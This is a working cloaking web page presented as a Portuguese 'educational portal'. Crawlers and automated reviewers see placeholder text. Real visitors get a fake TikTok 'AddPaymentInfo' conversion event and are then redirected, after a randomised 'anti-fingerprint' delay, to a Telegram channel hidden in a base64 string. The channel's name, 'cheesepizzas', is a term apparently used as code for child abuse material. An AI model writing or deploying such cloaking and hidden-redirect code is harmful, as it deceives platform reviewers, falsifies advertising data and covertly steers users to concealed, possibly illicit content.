<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Portal Educacional</title>
  <meta name="robots" content="index, follow" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <!-- TikTok Pixel Code Start -->
  <script>
    !function (w, d, t) {
      w.TiktokAnalyticsObject = t;
      var ttq = w[t] = w[t] || [];
      ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie"];
      ttq.setAndDefer = function (t, e) {
        t[e] = function () {
          t.push([e].concat(Array.prototype.slice.call(arguments, 0)))
        }
      };
      for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
      ttq.load = function (e, n) {
        var i = "https://analytics.tiktok.com/i18n/pixel/events.js";
        ttq._i = ttq._i || {};
        ttq._i[e] = [];
        ttq._i[e]._u = i;
        ttq._t = ttq._t || {};
        ttq._t[e] = +new Date;
        ttq._o = ttq._o || {};
        ttq._o[e] = n || {};
        var a = document.createElement("script");
        a.type = "text/javascript";
        a.async = !0;
        a.src = i + "?sdkid=" + e + "&lib=" + t;
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(a, s);
      };

      ttq.load('D1M9Q43C77U75N55I240'); // Seu ID Pixel TikTok
      ttq.page();
    }(window, document, 'ttq');
  </script>
  <!-- TikTok Pixel Code End -->

  <style>
    body {
      margin: 0;
      padding: 0;
      background: #fff;
      color: #333;
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    #white-content {
      display: none;
      text-align: center;
      padding: 40px;
    }
  </style>
</head>
<body>

  <div id="white-content">
    <h1>Bem-vindo ao nosso portal educacional</h1>
    <p>Conteúdo informativo em fase de atualização.</p>
  </div>

  <script>
    const isBot = () => {
      const n = navigator;
      const ua = n.userAgent || '';
      return (
        n.webdriver ||
        !n.languages ||
        n.languages.length === 0 ||
        !n.plugins ||
        n.plugins.length === 0 ||
        /bot|crawl|spider|facebook|google|Headless|PhantomJS/i.test(ua) &&
        !/TikTok/i.test(ua) // PERMITIR TikTok WebView
      );
    };

    const destino = atob("aHR0cHM6Ly90Lm1lL2NoZWVzc2VwaXp6YXMv"); // Telegram (link base64)

    if (isBot()) {
      document.getElementById("white-content").style.display = "block";
    } else {
      // Espera o pixel carregar antes de disparar o evento
      function aguardaPixelETrigaEvento(tentativas) {
        if (typeof ttq !== 'undefined' && typeof ttq.track === 'function') {
          ttq.track('AddPaymentInfo');
        } else if (tentativas < 10) {
          setTimeout(function () {
            aguardaPixelETrigaEvento(tentativas + 1);
          }, 300);
        }
      }

      setTimeout(function () {
        aguardaPixelETrigaEvento(0);
      }, 1000); // começa a checar o pixel depois de 1s

      // Delay aleatório entre 3s e 4s (anti-fingerprint)
      const delay = Math.floor(Math.random() * 1000) + 3000;
      setTimeout(function () {
        window.location.href = destino;
      }, delay);
    }
  </script>

</body>
</html>
